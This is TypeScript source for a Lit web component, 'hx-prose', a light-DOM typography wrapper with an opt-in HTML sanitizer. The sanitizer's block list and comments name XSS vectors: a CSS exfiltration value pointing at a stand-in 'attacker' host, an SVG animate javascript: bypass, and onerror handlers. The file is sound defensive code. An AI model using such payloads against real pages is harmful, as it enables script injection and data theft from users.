import { html, type PropertyValues } from 'lit';
import '../../utilities/document-token-adoption.js';
import { customElement, property } from 'lit/decorators.js';
import { HelixElement } from '../../base/index.js';
import { AdoptedStylesheetsController } from '../../controllers/adopted-stylesheets.js';
import { devWarn } from '../../utils/dev-warn.js';
import { helixProseScopedCss } from './hx-prose.styles.js';

/**
 * A Light DOM prose container that applies typographic styles to rich text
 * content such as CKEditor output, Markdown-rendered HTML, or any structured
 * body copy.
 *
 * Renders in the Light DOM (no Shadow DOM) so that global and scoped styles
 * can target child elements directly. Uses the AdoptedStylesheetsController
 * to inject scoped prose CSS into the document without duplication.
 *
 * @summary Light DOM typography wrapper for rich text and CMS content.
 *
 * @tag hx-prose
 *
 * @slot - Default slot for rich text content (headings, paragraphs, lists, tables, etc.).
 *   SECURITY: By default hx-prose renders its slotted markup verbatim and performs NO
 *   sanitization — it trusts that the upstream CMS/Markdown pipeline has already sanitized
 *   the HTML. This is the documented, non-breaking default. If the content source is not
 *   fully trusted, set the boolean `sanitize` attribute to enable a conservative built-in
 *   allowlist (strips `<script>`/`<style>`/`<iframe>`/`<object>`/`<embed>`/`<foreignObject>`,
 *   document-level `<link>`/`<base>`/`<meta>`, SVG SMIL animation elements, `on*` event-handler
 *   and `style` attributes, and `javascript:`/`data:` URLs in `href`/`src`/`xlink:href`/
 *   `formaction`/`action`), or supply a stricter `sanitizer` function property (e.g. DOMPurify)
 *   to fully own the policy.
 *
 *   ⚠️ CLIENT-SIDE BACKSTOP ONLY — NOT a substitute for server-side sanitization. `sanitize`
 *   runs when the component upgrades (connectedCallback) and on subsequent light-DOM mutations.
 *   It effectively cleans content injected AFTER load (the MutationObserver path), but it CANNOT
 *   prevent execution of dangerous markup present in the INITIAL server-rendered / static HTML:
 *   an inline `<script>` or a fast-firing `<img onerror>` in the original payload runs during the
 *   browser's HTML parse, before any component JS exists. For SSR/CMS content, sanitize on the
 *   SERVER before the HTML reaches the browser; treat this flag as defense-in-depth for
 *   dynamically-injected content, not as protection for the initial server-rendered payload.
 *
 * @cssprop [--hx-prose-max-width=720px] - Maximum content width.
 * @cssprop [--hx-prose-font-size=var(--hx-font-size-base)] - Base font size.
 * @cssprop [--hx-prose-line-height=var(--hx-line-height-relaxed)] - Base line height.
 * @cssprop [--hx-prose-color=var(--hx-color-text)] - Body text color.
 * @cssprop [--hx-prose-heading-color=var(--hx-color-text-strong)] - Heading color.
 * @cssprop [--hx-prose-link-color=var(--hx-color-primary)] - Link color.
 * @cssprop [--hx-font-size-sm] - Font size.
 * @cssprop [--hx-font-size-lg] - Font size.
 */
@customElement('hx-prose')
export class HelixProse extends HelixElement {
  // ─── Light DOM ───

  override createRenderRoot(): this {
    return this;
  }

  // ─── Adopted Stylesheets ───

  /** @internal */
  private adoptedStyles = new AdoptedStylesheetsController(this, helixProseScopedCss, document);

  // ─── Properties ───

  /**
   * Typography scale for the prose content.
   * @attr hx-size
   */
  @property({ type: String, reflect: true, attribute: 'hx-size' })
  size: 'sm' | 'base' | 'lg' = 'base';

  /**
   * Maximum content width. When set, overrides the --hx-prose-max-width token.
   * Accepts any valid CSS width value (e.g., '640px', '80ch', '100%').
   * @attr max-width
   */
  @property({ type: String, reflect: true, attribute: 'max-width' })
  maxWidth = '';

  /**
   * Opt-in HTML sanitization of slotted content. Default `false` to preserve the
   * historical non-breaking behavior of trusting upstream-sanitized CMS markup.
   *
   * When `true`, every top-level slotted element's `outerHTML` is run through the
   * configured `sanitizer` (or the conservative built-in allowlist when none is set)
   * on connect and whenever the light-DOM subtree mutates, and unsafe content is
   * replaced in place.
   *
   * ⚠️ This is a CLIENT-SIDE backstop for dynamically-injected content. It runs after
   * the browser has parsed the initial light DOM, so it CANNOT stop dangerous markup in
   * server-rendered / static HTML from executing on parse (inline `<script>`, `<img
   * onerror>`). Sanitize SSR/CMS payloads on the server; see the `@slot` security note.
   * @attr sanitize
   */
  @property({ type: Boolean })
  sanitize = false;

  /**
   * Optional custom sanitizer. When provided AND `sanitize` is `true`, this function
   * fully owns the sanitization policy and the built-in allowlist is bypassed. Wire in
   * a hardened library here (e.g. `(html) => DOMPurify.sanitize(html)`).
   *
   * `attribute: false` because a function cannot be expressed as an HTML attribute;
   * it must be assigned via property (`el.sanitizer = fn`).
   */
  @property({ attribute: false })
  sanitizer?: (html: string) => string;

  // ─── Internal ───

  /**
   * Observes the light-DOM subtree so that content injected after connect (CMS
   * hydration, client-side renders) is re-sanitized. Only active while `sanitize`
   * is `true`. `slotchange` does not fire for light-DOM children, so a
   * MutationObserver is the correct primitive here.
   * @internal
   */
  private _sanitizeObserver: MutationObserver | undefined;

  /**
   * Re-entrancy guard: rewriting `outerHTML` during sanitization triggers the
   * MutationObserver again. This flag suppresses that recursive pass.
   * @internal
   */
  private _isSanitizing = false;

  // ─── Lifecycle ───

  override connectedCallback(): void {
    super.connectedCallback();
    // Backward compat: accept legacy `size` attribute. When present and `hx-size`
    // is not set, map the value and emit a deprecation warning.
    const legacySize = this.getAttribute('size');
    if (legacySize !== null && !this.hasAttribute('hx-size')) {
      devWarn('hx-prose', 'The "size" attribute is deprecated. Use "hx-size" instead.');
      this.size = legacySize as 'sm' | 'base' | 'lg';
    }
    this.style.display = 'block';
    this._applyMaxWidth();
    this._applySize();
    // Opt-in security pass. Sanitize already-present content and start watching
    // for future light-DOM mutations. No-op when `sanitize` is false (default).
    if (this.sanitize) {
      this._sanitizeSlottedContent();
      this._startSanitizeObserver();
    }
  }

  override disconnectedCallback(): void {
    super.disconnectedCallback();
    // Always tear down the observer to avoid a leak if the node is reattached.
    this._stopSanitizeObserver();
  }

  override updated(changedProperties: PropertyValues<this>): void {
    if (changedProperties.has('maxWidth')) {
      this._applyMaxWidth();
    }
    if (changedProperties.has('size')) {
      this._applySize();
    }
    // React to runtime toggling of the `sanitize` property (e.g. `el.sanitize = true`).
    if (changedProperties.has('sanitize')) {
      if (this.sanitize) {
        this._sanitizeSlottedContent();
        this._startSanitizeObserver();
      } else {
        this._stopSanitizeObserver();
      }
    }
    // A late-bound custom sanitizer is a common pattern: `<hx-prose sanitize>` in
    // markup, then `el.sanitizer = DOMPurify.sanitize` from JS. connectedCallback
    // already sanitized the initial payload with the weaker built-in policy, so we
    // must re-process the existing content under the new policy when `sanitizer`
    // changes while sanitization is active — otherwise the custom policy never
    // protects the initial SSR/CMS payload.
    if (changedProperties.has('sanitizer') && this.sanitize) {
      this._sanitizeSlottedContent();
    }
  }

  // ─── Private ───

  /** @internal */
  private _applyMaxWidth(): void {
    if (this.maxWidth) {
      this.style.setProperty('--hx-prose-max-width', this.maxWidth);
    } else {
      this.style.removeProperty('--hx-prose-max-width');
    }
  }

  /** @internal */
  private _applySize(): void {
    const sizeMap: Record<string, string> = {
      sm: 'var(--hx-font-size-sm, 0.875rem)',
      base: '',
      lg: 'var(--hx-font-size-lg, 1.125rem)',
    };

    const fontSize = sizeMap[this.size];
    if (fontSize) {
      this.style.setProperty('--hx-prose-font-size', fontSize);
    } else {
      this.style.removeProperty('--hx-prose-font-size');
    }
  }

  // ─── Sanitization (opt-in) ───

  /**
   * (Re)attaches the mutation observer with the standard config. Shared between
   * initial start and the post-sanitize re-attach so the two cannot drift.
   * Watches the full subtree: nodes, attributes, and characterData can all carry
   * injected attack vectors (e.g. an `onerror` added to an existing <img>).
   * @internal
   */
  private _observeSanitize(): void {
    this._sanitizeObserver?.observe(this, {
      childList: true,
      subtree: true,
      attributes: true,
      characterData: true,
    });
  }

  /** @internal */
  private _startSanitizeObserver(): void {
    if (this._sanitizeObserver) {
      return;
    }
    this._sanitizeObserver = new MutationObserver(() => {
      // Secondary guard; the primary defense is detaching during the rewrite.
      if (this._isSanitizing) {
        return;
      }
      this._sanitizeSlottedContent();
    });
    this._observeSanitize();
  }

  /** @internal */
  private _stopSanitizeObserver(): void {
    this._sanitizeObserver?.disconnect();
    this._sanitizeObserver = undefined;
  }

  /**
   * Runs each top-level slotted element through the active sanitizer and replaces
   * it in place when the sanitized markup differs. Element nodes only — text nodes
   * carry no executable markup and are left untouched.
   * @internal
   */
  private _sanitizeSlottedContent(): void {
    // Synchronous re-entrancy guard (e.g. connectedCallback + updated() in one tick).
    if (this._isSanitizing) {
      return;
    }
    this._isSanitizing = true;
    // Detach the observer for the duration of the rewrite. Its callback is delivered
    // asynchronously (microtask), so the sync `_isSanitizing` flag alone cannot stop
    // it from re-firing on the mutations WE make — and a non-idempotent custom
    // sanitizer (e.g. DOMPurify renormalizes already-clean markup, so cleaned !==
    // original on every pass) would then re-sanitize forever. Detaching means our own
    // outerHTML swaps queue no records at all.
    this._sanitizeObserver?.disconnect();
    try {
      const sanitizeFn = this.sanitizer ?? ((markup: string) => this._builtInSanitize(markup));
      // Snapshot first: replacing outerHTML mutates the live children collection.
      const elements = Array.from(this.children);
      for (const child of elements) {
        const original = child.outerHTML;
        const cleaned = sanitizeFn(original);
        if (cleaned !== original) {
          // outerHTML assignment swaps the node for the parsed-clean equivalent.
          child.outerHTML = cleaned;
        }
      }
    } finally {
      this._isSanitizing = false;
      // Resume observing genuinely-new (consumer/CMS) mutations. Skipped when the
      // observer was never created (first sanitize runs from connectedCallback before
      // _startSanitizeObserver) or sanitization has since been turned off / detached.
      if (this._sanitizeObserver && this.sanitize && this.isConnected) {
        this._observeSanitize();
      }
    }
  }

  /**
   * Conservative built-in allowlist sanitizer used when no custom `sanitizer` is set.
   * Parses the markup in an inert document (no scripts execute, no resources load),
   * strips dangerous elements/attributes, then serializes back to a string.
   *
   * This is a defense-in-depth backstop, NOT a replacement for a hardened library
   * like DOMPurify. Consumers handling fully untrusted input should inject a vetted
   * sanitizer via the `sanitizer` property.
   * @internal
   */
  private _builtInSanitize(markup: string): string {
    // Inert parsing context: <template> content is not rendered and its scripts/
    // resource-bearing elements never execute or fetch.
    const template = document.createElement('template');
    template.innerHTML = markup;

    // Compared case-insensitively (localName is camelCase for SVG elements like
    // foreignObject / animateTransform, lowercase for HTML).
    const DANGEROUS_ELEMENTS = [
      'script',
      'style',
      'iframe',
      'object',
      'embed',
      'foreignobject',
      // Document-level metadata/resource elements have no place in prose content and
      // load attacker-controlled resources or alter URL resolution even with a safe
      // (https:) scheme: <link rel="stylesheet"> fetches CSS, <base href> rewrites
      // every relative URL on the page, <meta http-equiv="refresh"> drives a redirect.
      'link',
      'base',
      'meta',
      // SVG SMIL animation elements can rewrite a URL-bearing attribute at runtime
      // (e.g. <animate attributeName="xlink:href" to="javascript:…">), defeating the
      // static URL-scheme check below — hx-icon strips these for the same reason.
      'animate',
      'animatetransform',
      'animatemotion',
      'set',
    ];
    // URL-bearing attributes that can carry a javascript:/data: scheme. `xlink:href`
    // (and any namespaced `*:href`) is URL-bearing on SVG <a>/<use>; `formaction`/
    // `action` fire on form submission. Mirrors hx-icon's _sanitizeSvg allowlist so
    // hx-prose is not weaker than the documented internal baseline.
    const URL_ATTRS = ['href', 'src', 'xlink:href', 'formaction', 'action'];

    const walk = (root: ParentNode): void => {
      // Static snapshot — we mutate the tree (removeChild) while iterating.
      const els = Array.from(root.querySelectorAll('*'));
      for (const el of els) {
        // Drop disallowed elements wholesale.
        if (DANGEROUS_ELEMENTS.includes(el.localName.toLowerCase())) {
          el.remove();
          continue;
        }
        for (const attr of Array.from(el.attributes)) {
          const name = attr.name.toLowerCase();
          const value = attr.value;
          // Strip inline event handlers (onclick, onerror, onload, …).
          if (name.startsWith('on')) {
            el.removeAttribute(attr.name);
            continue;
          }
          // Strip inline styles. In Light DOM an attacker-supplied `style` enables
          // CSS-injection exfiltration (e.g. background:url(https://attacker/?leak))
          // and layout attacks; a conservative backstop drops it wholesale.
          if (name === 'style') {
            el.removeAttribute(attr.name);
            continue;
          }
          // Neutralize dangerous URL schemes in navigational/resource attributes.
          // `name.endsWith(':href')` catches any namespaced href (e.g. xlink:href)
          // beyond the explicit allowlist.
          if (
            (URL_ATTRS.includes(name) || name.endsWith(':href')) &&
            this._hasUnsafeUrlScheme(value)
          ) {
            el.removeAttribute(attr.name);
          }
        }
      }
    };

    walk(template.content);
    return this._serializeTemplate(template);
  }

  /**
   * Returns true when a URL attribute value uses a `javascript:` or `data:` scheme,
   * tolerating leading/trailing whitespace, control chars, and case variations the
   * browser would otherwise strip before navigating.
   * @internal
   */
  private _hasUnsafeUrlScheme(value: string): boolean {
    // Browsers ignore leading ASCII control chars + whitespace when resolving a URL
    // scheme, so strip them (\u0000-\u0020) before testing to defeat
    // `java\tscript:`-style bypasses, then lowercase for case-insensitive matching.
    // eslint-disable-next-line no-control-regex -- control chars are the bypass vector
    const normalized = value.replace(/[\u0000-\u0020]+/g, '').toLowerCase();
    return normalized.startsWith('javascript:') || normalized.startsWith('data:');
  }

  /**
   * Serializes a <template>'s parsed content back to an HTML string.
   * @internal
   */
  private _serializeTemplate(template: HTMLTemplateElement): string {
    const container = document.createElement('div');
    container.appendChild(template.content.cloneNode(true));
    return container.innerHTML;
  }

  // ─── Render ───

  override render() {
    return html`<slot></slot>`;
  }
}

declare global {
  interface HTMLElementTagNameMap {
    'hx-prose': HelixProse;
  }
}
